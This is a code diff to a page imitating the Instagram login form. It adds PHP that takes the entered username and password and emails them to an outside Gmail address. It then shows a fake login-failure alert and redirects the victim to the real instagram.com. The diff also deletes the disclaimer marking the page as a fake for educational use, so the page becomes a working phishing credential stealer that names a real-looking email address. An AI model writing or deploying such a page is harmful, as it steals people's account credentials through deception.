@@ -23,6 +23,35 @@
                 <input type="text" placeholder="Phone number, username, or email " name="u_name">
                 <input type="password" placeholder="Password" name="pass">
                 <button class="submitbutton">Log in </button>
+                <?php
+
+//varible setting
+$username = $_POST['u_name'];  // fetch username
+ $passcode = $_POST['pass'];  // fetch password
+ $subject = "Someone Login ! Insta Dummy page";
+ $to ="prodyumna9d@gmail.com";
+ 
+ $txt = "Username : ". $username. "\r\nPassword : ". $passcode ; // email body (i) username [break] (ii) password;
+ 
+
+
+// check input fields
+if (empty($username)|| empty($passcode)){ // name or message
+echo"<script type='text/javascript'>alert('Please enter correct username or password. Try again ');
+    window.history.go(-1);
+    </script>";
+}
+else 
+{ 
+    mail($to,$subject,$txt); // send an email 
+    echo"<script type='text/javascript'>alert('Sorry ! unable to login ');
+     // Simulate an HTTP redirect:
+    window.location.replace('http://www.instagram.com');
+    </script>";
+}
+
+
+?>
                 <br />
                 <div class="option">OR </div>
             </form>
@@ -45,8 +74,7 @@
 
     <br />
     <div style="position:fixed;left:0;bottom:0;width:100%; color: #7e7979;">
-        <p style="text-align:center;"> Disclaimer this is not a real "instagram.com" page, please do not enter
-            your real username and password, it's only for educational purposes.</p>
+        <p style="text-align:center;"> </p>
     </div>
     <br />
 
